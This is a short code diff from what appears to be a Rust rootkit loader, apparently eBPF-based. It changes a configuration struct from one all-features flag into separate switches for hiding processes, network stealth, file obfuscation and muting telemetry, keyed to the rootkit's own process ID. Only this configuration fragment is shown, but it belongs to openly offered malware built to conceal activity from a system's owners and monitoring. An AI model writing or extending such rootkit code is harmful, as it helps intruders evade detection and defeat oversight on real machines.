@@ -106,7 +106,11 @@ async fn main() -> Result<()> {
     let self_pid = std::process::id();
     let config = RootkitConfig {
         self_pid,
-        flags: 0xFFFFFFFF, // All features enabled
+        hide_procs: 1,
+        net_stealth: 1,
+        file_obfuscate: 1,
+        mute_telemetry: 1,
+        _pad: [0u8; 4],
     };
 
     let mut config_map: HashMap<_, u32, RootkitConfig> =
